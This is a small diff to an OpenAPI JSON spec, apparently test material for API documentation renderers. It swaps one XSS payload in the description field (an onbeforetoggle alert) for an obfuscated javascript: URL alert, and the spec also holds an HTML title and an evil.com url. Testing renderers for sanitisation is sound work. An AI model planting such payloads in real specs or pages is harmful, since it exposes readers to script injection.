@@ -2,7 +2,7 @@
   "openapi": "3.0.1",
   "info": {
     "title": "<h1>test</h1>", 
-    "description": "<details open onbeforetoggle=alert('xss0r')>",
+    "description": "<a href="%01javasc%09ript:alert%26grave;`">",
     "url": "https://evil.com"
   },
   "paths": {}
